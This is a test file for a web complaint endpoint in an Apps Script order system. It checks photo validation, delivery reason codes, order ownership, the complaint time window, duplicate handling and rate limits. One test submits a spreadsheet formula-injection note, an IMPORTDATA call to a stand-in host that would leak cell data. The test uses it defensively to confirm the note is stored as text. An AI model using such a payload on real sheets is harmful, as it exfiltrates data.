// Complaints (2026-11-03): a logged-in shop reports a problem with a delivered order, with 1–3 photos. Written into the
// DIFOT tables the teammate's app already uses: Exception rows (Stage After_Delivery, reason RD-xx from Master),
// Order.Status = Issue + Customer_Issue, and an Event row. Photos go to <sheet folder>/Exception_Images.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { loadBackend, guestOrder } from '../helpers/apps-script.mjs';

const OWNER = 'owner@example.com';
const PHONE = '0812345678';
const DAY = 24 * 3600 * 1000;
// Smallest bytes that pass the image check (magic number + some body).
const JPEG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(200, 7)]).toString('base64');
const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(100, 1)]).toString('base64');
const photo = (base64 = JPEG, mime = 'image/jpeg') => ({ mime, base64 });

function ready() {
  const b = loadBackend();
  b.ctx.setup();
  // Reasons as they are in the sandbox Master (2026-11-03), plus a pick reason that a complaint must not use.
  const m = b.sheet('Master');
  const reasons = [['RD-01', 'ของขาด'], ['RD-02', 'ได้ของผิด'], ['RD-03', 'ของเสียหาย'], ['RD-04', 'ไม่เย็น'],
    ['RD-05', 'ส่งช้า'], ['RD-06', 'อื่นๆ']];
  const add = row => m.appendRow(m.header().map(h => row[h] ?? ''));
  reasons.forEach(([Code, Name], i) => add({ Code, Type: 'Reason_Delivery', Name, Sort_Order: i + 1, Active: 'Yes', Shop_ID: 'SU22' }));
  add({ Code: 'RP-01', Type: 'Reason_Pick', Name: 'ของหมด', Active: 'Yes', Shop_ID: 'SU22' });
  b.admin = (fn, ...args) => {
    b.session.user = OWNER;
    try { return JSON.parse(JSON.stringify(b.ctx[fn](...args))); } finally { b.session.user = ''; }
  };
  b.member = (over = {}) => {
    const res = b.admin('adminCreateShop', { name: 'Café Sukhumvit', phone: PHONE, contact: 'Ken', address: '22 Sukhumvit Soi 22', ...over });
    const first = b.post({ action: 'login', phone: over.phone || PHONE, password: res.temp_password });
    const done = b.post({ action: 'set_password', change_token: first.change_token, new_password: 'mango-sticky-rice' });
    return { id: res.shop.id, token: done.token };
  };
  // An order row straight into the sheet, two lines (PK-001 ฿240, CK-001 ฿130).
  b.addOrder = ({ id = 'W261101-001', customer, auth = 'member', status = 'Delivered', deliveredDaysAgo = 1 }) => {
    const put = (tab, row) => { const s = b.sheet(tab); s.appendRow(s.header().map(h => row[h] ?? '')); };
    put('Order', { Order_ID: id, Shop_ID: 'SU22', Order_Date: new Date(Date.now() - (deliveredDaysAgo + 1) * DAY), Customer_ID: customer,
      Status: status, Customer_Issue: false, T5_Delivered: status === 'Delivered' ? new Date(Date.now() - deliveredDaysAgo * DAY) : '',
      Source: 'Web', Web_Total: 370, Auth: auth });
    put('Order_Items', { Item_ID: id + '-1', Order_ID: id, SKU: 'PK-001', Name_TH: 'มันแข็งหมู', Qty: 3, Qty_Unit: 'kg', Unit_Price: 80, Line_Total: 240 });
    put('Order_Items', { Item_ID: id + '-2', Order_ID: id, SKU: 'CK-001', Name_TH: 'ไก่', Qty: 2, Qty_Unit: 'kg', Unit_Price: 65, Line_Total: 130 });
    return id;
  };
  b.complain = (token, over = {}) => b.post({ contract: 'order.v1', action: 'complain', token, order_id: 'W261101-001',
    reason: 'RD-03', skus: ['PK-001'], note: 'ถุงขาด', photos: [photo()], client_id: 'c0mpla1nt-0001', ...over });
  return b;
}

test('complaint: Exception row per product, order set to Issue, Event row, photos saved next to the sheet', () => {
  const b = ready();
  const m = b.member();
  b.addOrder({ customer: m.id });
  const res = b.complain(m.token, { skus: ['PK-001', 'CK-001'], photos: [photo(), photo(PNG, 'image/png')] });
  assert.equal(res.ok, true, JSON.stringify(res));
  assert.match(res.complaint_id, /^CW[0-9A-F]{8}$/);

  const ex = b.sheet('Exception').records();
  assert.equal(ex.length, 2);
  const p1 = `Exception_Images/${res.complaint_id}-1.jpg`, p2 = `Exception_Images/${res.complaint_id}-2.png`;
  ex.forEach((e, i) => {
    assert.match(e.Exception_ID, /^XW[0-9A-F]{8}$/);
    assert.equal(e.Order_ID, 'W261101-001');
    assert.equal(e.Shop_ID, 'SU22');
    assert.equal(e.Stage, 'After_Delivery');
    assert.equal(e.SKU_Code, ['PK-001', 'CK-001'][i]);
    assert.equal(e.Reason_Code, 'RD-03');
    assert.equal(e.Other_Note, 'ถุงขาด');
    assert.equal(typeof e.Logged_At.getTime, 'function');   // a Date from the script's own realm
    assert.equal(e.Logged_By, 'web:' + m.id);
    assert.equal(e.Source, 'Web');
    assert.equal(e.Complaint_ID, res.complaint_id);
    assert.equal(e.Web_Item, ['มันแข็งหมู', 'ไก่'][i]);   // SKU_Code is our SKU, not in DIFOT's Master: staff read the name here
    assert.equal(e.Photo, p1);
    assert.equal(e.Photo_2, p2);
    assert.equal(e.Photo_3, '');
  });
  assert.notEqual(ex[0].Exception_ID, ex[1].Exception_ID);

  const order = b.sheet('Order').records()[0];
  assert.equal(order.Status, 'Issue');
  assert.equal(order.Customer_Issue, true);

  const ev = b.sheet('Event').records().at(-1);
  assert.equal(ev.Order_ID, 'W261101-001');
  assert.equal(ev.Station, 'Web');
  assert.equal(ev.Action, 'Customer_Issue');
  assert.equal(ev.Photo, p1);
  assert.match(ev.Note, new RegExp(res.complaint_id));

  // Files: in Exception_Images inside the folder the sheet is in, bytes as sent.
  const saved = [...b.drive.files.values()].filter(f => f.blob && /^CW/.test(f.getName()));
  assert.deepEqual(saved.map(f => f.getName()).sort(), [p1, p2].map(p => p.split('/')[1]).sort());
  const folder = b.drive.folders.get(saved[0].folderId);
  assert.equal(folder.name, 'Exception_Images');
  assert.equal(b.drive.folders.get(folder.parentId).name, 'SmartMenuSandboxDIFOT-93916087');
  assert.equal(saved.find(f => f.getName().endsWith('.jpg')).blob.data.toString('base64'), JPEG);
});

test('complaint about the whole order (no product picked) is one row with an empty SKU', () => {
  const b = ready();
  const m = b.member();
  b.addOrder({ customer: m.id });
  const res = b.complain(m.token, { skus: [], reason: 'RD-05', note: '' });
  assert.equal(res.ok, true, JSON.stringify(res));
  const ex = b.sheet('Exception').records();
  assert.equal(ex.length, 1);
  assert.equal(ex[0].SKU_Code, '');
  assert.equal(ex[0].Reason_Code, 'RD-05');
});

test('complaint needs 1 to 3 real photos of an allowed type and size', () => {
  const b = ready();
  const m = b.member();
  b.addOrder({ customer: m.id });
  assert.equal(b.complain(m.token, { photos: [] }).error, 'photo');
  assert.equal(b.complain(m.token, { photos: undefined }).error, 'photo');
  assert.equal(b.complain(m.token, { photos: [photo(), photo(), photo(), photo()] }).error, 'photo');
  assert.equal(b.complain(m.token, { photos: [photo(PNG, 'image/jpeg')] }).error, 'photo_type');     // bytes are not a JPEG
  assert.equal(b.complain(m.token, { photos: [photo(JPEG, 'image/gif')] }).error, 'photo_type');
  assert.equal(b.complain(m.token, { photos: [photo('not base64!', 'image/jpeg')] }).error, 'photo_type');
  const big = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff]), Buffer.alloc(700 * 1024)]).toString('base64');
  assert.equal(b.complain(m.token, { photos: [photo(big)] }).error, 'photo_size');
  assert.equal(b.sheet('Exception').records().length, 0);
  assert.equal(b.sheet('Order').records()[0].Status, 'Delivered');
});

test('complaint reason must be an active delivery reason; "other" needs a note', () => {
  const b = ready();
  const m = b.member();
  b.addOrder({ customer: m.id });
  assert.equal(b.complain(m.token, { reason: 'RP-01' }).error, 'reason');
  assert.equal(b.complain(m.token, { reason: 'RD-99' }).error, 'reason');
  assert.equal(b.complain(m.token, { reason: 'RD-06', note: '  ' }).error, 'note');
  assert.equal(b.complain(m.token, { note: 'x'.repeat(401) }).error, 'note');
  assert.equal(b.complain(m.token, { skus: ['PK-999'] }).error, 'items');
  assert.equal(b.complain(m.token, { skus: 'PK-001' }).error, 'items');
  assert.equal(b.complain(m.token, { reason: 'RD-06', note: 'ขอใบกำกับภาษี' }).ok, true);
});

test('complaint only on the shop\'s own delivered order, within 7 days of delivery', () => {
  const b = ready();
  const m = b.member();
  const other = b.member({ name: 'Other shop', phone: '0899999999' });
  b.addOrder({ id: 'W261101-001', customer: other.id });                       // another shop's order
  b.addOrder({ id: 'W261101-002', customer: m.id, auth: 'guest' });            // filed under the shop by a typed phone
  b.addOrder({ id: 'W261101-003', customer: m.id, status: 'Out' });
  b.addOrder({ id: 'W261101-004', customer: m.id, deliveredDaysAgo: 8 });
  b.addOrder({ id: 'W261101-005', customer: m.id, auth: 'shop_qr', deliveredDaysAgo: 6 });
  assert.equal(b.complain(m.token, { order_id: 'W261101-001' }).error, 'not_found');
  assert.equal(b.complain(m.token, { order_id: 'W261101-002' }).error, 'not_found');
  assert.equal(b.complain(m.token, { order_id: 'nonsense' }).error, 'not_found');
  assert.equal(b.complain(m.token, { order_id: 'W261101-003' }).error, 'not_delivered');
  assert.equal(b.complain(m.token, { order_id: 'W261101-004' }).error, 'too_late');
  assert.equal(b.complain(m.token, { order_id: 'W261101-005' }).ok, true);
  assert.equal(b.complain('f'.repeat(64)).error, 'session');
  assert.equal(b.complain(undefined).error, 'session');
});

test('a retried complaint (same client_id) is written once; at most 3 complaints per order', () => {
  const b = ready();
  const m = b.member();
  b.addOrder({ customer: m.id });
  const first = b.complain(m.token);
  const again = b.complain(m.token);
  assert.equal(again.ok, true);
  assert.equal(again.complaint_id, first.complaint_id);
  assert.equal(again.duplicate, true);
  assert.equal(b.sheet('Exception').records().length, 1);
  b.cache.clear();   // the cache can be emptied by Google at any time: the sheet still knows the id
  assert.equal(b.complain(m.token).complaint_id, first.complaint_id);
  assert.equal(b.sheet('Exception').records().length, 1);

  // Status is now Issue: more problems with the same order can still be sent, up to 3 in all.
  assert.equal(b.complain(m.token, { client_id: 'c0mpla1nt-0002' }).ok, true);
  assert.equal(b.complain(m.token, { client_id: 'c0mpla1nt-0003' }).ok, true);
  assert.equal(b.complain(m.token, { client_id: 'c0mpla1nt-0004' }).error, 'rate');
  assert.equal(b.complain(m.token, { client_id: 'bad id' }).error, 'client_id');
});

test('complaint text stays text in the sheet (no formulas)', () => {
  const b = ready();
  const m = b.member();
  b.addOrder({ customer: m.id });
  assert.equal(b.complain(m.token, { note: '=IMPORTDATA("https://x.example/"&A2)' }).ok, true);
  assert.equal(b.sheet('Exception').records()[0].Other_Note, '=IMPORTDATA("https://x.example/"&A2)');
});

test('a complaint body may carry photos (bigger than an order); an order may not', () => {
  const b = ready();
  const m = b.member();
  b.addOrder({ customer: m.id });
  const photoB64 = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff]), Buffer.alloc(500 * 1024, 3)]).toString('base64');
  assert.equal(b.complain(m.token, { photos: [photo(photoB64), photo(photoB64), photo(photoB64)] }).ok, true);
  assert.equal(b.post({ ...guestOrder(), note: 'x', pad: 'y'.repeat(40000) }).error, 'too_big');
  assert.equal(b.post('{"action":"complain","pad":"' + 'y'.repeat(3000000) + '"}').error, 'too_big');
});

test('history says which orders can still get a complaint, until when, and how many were sent', () => {
  const b = ready();
  const m = b.member();
  b.addOrder({ id: 'W261101-001', customer: m.id, deliveredDaysAgo: 2 });
  b.addOrder({ id: 'W261101-003', customer: m.id, status: 'Out' });
  b.addOrder({ id: 'W261101-004', customer: m.id, deliveredDaysAgo: 8 });
  b.complain(m.token, { skus: ['PK-001', 'CK-001'] });   // one complaint, two rows
  const res = b.post({ action: 'history', token: m.token });
  const by = Object.fromEntries(res.orders.map(o => [o.id, o]));
  const until = Date.parse(by['W261101-001'].complain_until);
  assert.ok(Math.abs(until - (Date.now() + 5 * DAY)) < 60000, by['W261101-001'].complain_until);
  assert.equal(by['W261101-001'].status, 'Issue');
  assert.equal(by['W261101-001'].complaints, 1);
  assert.equal(by['W261101-003'].complain_until, '');
  assert.equal(by['W261101-004'].complain_until, '');
  assert.equal(by['W261101-003'].complaints, 0);
});

test('setup adds the complaint columns to Exception and keeps its own', () => {
  const b = ready();
  assert.deepEqual(b.sheet('Exception').header(), ['Exception_ID', 'Order_ID', 'Shop_ID', 'Stage', 'SKU_Code', 'Reason_Code',
    'Other_Note', 'Logged_At', 'Logged_By', 'Source', 'Complaint_ID', 'Web_Item', 'Photo', 'Photo_2', 'Photo_3']);
});
